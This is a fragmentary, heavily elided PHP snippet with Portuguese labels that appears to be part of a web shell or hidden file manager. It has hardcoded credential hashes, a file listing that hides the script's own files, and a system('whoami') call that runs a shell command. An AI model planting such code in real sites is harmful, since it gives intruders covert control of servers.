<?
	...
	$adm->usuario	= "6720720054e9d24fbf6c20a831ff287e";
	$adm->senha = "590b3fee6dacbe9327ecf91583521aff";
...
if(file_exists($adm->dirPasta)){
 ...
 if("$adm->dirPasta/$arquivo" != "./$adm->arq" && "$adm->dirPasta/$arquivo" != "./_fclose.gif" && "$adm->dirPasta/$arquivo" != "./_fopen.gif" && $arquivo != "." && $arquivo != ".." && "$adm->dirPasta/$arquivo" != "./z.lib.php")
 $file[] = $arquivo;
...
<? }else{ ?>
 ...
 | Usu&aacute;rio: <? echo system('whoami'); ?></td>
 </tr>
 <tr>
